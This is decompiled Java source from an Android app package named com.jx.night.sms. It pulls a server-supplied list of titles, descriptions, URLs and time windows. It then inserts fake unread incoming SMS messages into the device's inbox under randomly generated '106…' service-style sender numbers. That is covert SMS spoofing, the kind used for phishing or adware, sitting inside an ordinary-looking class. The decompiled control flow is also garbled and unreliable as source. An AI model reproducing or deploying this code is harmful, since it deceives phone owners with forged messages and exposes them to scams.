package com.jx.night.sms;

import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.net.Uri;
import android.util.Log;
import com.jx.night.unit.MyConst;
import com.litesuits.http.LiteHttp;
import com.litesuits.http.request.StringRequest;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class c
{
  public c() {}
  
  private e a(String paramString)
  {
    for (;;)
    {
      try
      {
        localE = new e(this);
        try
        {
          localArrayList = new ArrayList();
          paramString = new JSONObject(paramString);
          localE.a = paramString.optInt("time");
          paramString = paramString.optJSONArray("list");
          Log.e("list info   ", paramString + "");
          if (paramString == null) {
            break label241;
          }
          if (paramString.length() >= 1) {
            break label243;
          }
        }
        catch (JSONException paramString)
        {
          ArrayList localArrayList;
          JSONObject localJSONObject;
          Object localObject;
          return localE;
        }
        if (i < paramString.length())
        {
          localJSONObject = paramString.optJSONObject(i);
          localObject = new e(this);
          localObject.getClass();
          localObject = new f((e)localObject);
          ((f)localObject).a = localJSONObject.optString("describe");
          ((f)localObject).b = localJSONObject.optString("endHour");
          ((f)localObject).c = localJSONObject.optString("picUrl");
          ((f)localObject).d = localJSONObject.optString("startHour");
          ((f)localObject).e = localJSONObject.optString("title");
          ((f)localObject).f = localJSONObject.optString("type");
          ((f)localObject).g = localJSONObject.optString("url");
          localArrayList.add(localObject);
          i += 1;
          continue;
        }
        localE.b = localArrayList;
        return localE;
      }
      catch (JSONException paramString)
      {
        e localE;
        return null;
      }
      label241:
      return null;
      label243:
      int i = 0;
    }
  }
  
  private static String a()
  {
    Random localRandom = new Random();
    StringBuffer localStringBuffer = new StringBuffer();
    int i = 0;
    while (i < 9)
    {
      localStringBuffer.append(localRandom.nextInt(10));
      i += 1;
    }
    return "106" + localStringBuffer.toString();
  }
  
  public static void a(Context paramContext, String paramString1, String paramString2)
  {
    if (paramContext == null) {
      return;
    }
    paramContext = (StringRequest)new StringRequest(MyConst.X).setHttpListener(new d(paramContext, paramString1, paramString2));
    MyConst.y.executeAsync(paramContext);
  }
  
  private static void b(Context paramContext, String paramString)
  {
    paramContext = paramContext.getContentResolver();
    Uri localUri = Uri.parse("content://sms/");
    ContentValues localContentValues = new ContentValues();
    localContentValues.put("address", a());
    localContentValues.put("type", Integer.valueOf(1));
    localContentValues.put("read", Integer.valueOf(0));
    localContentValues.put("date", Long.valueOf(System.currentTimeMillis()));
    localContentValues.put("body", paramString);
    try
    {
      paramContext.insert(localUri, localContentValues);
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
}
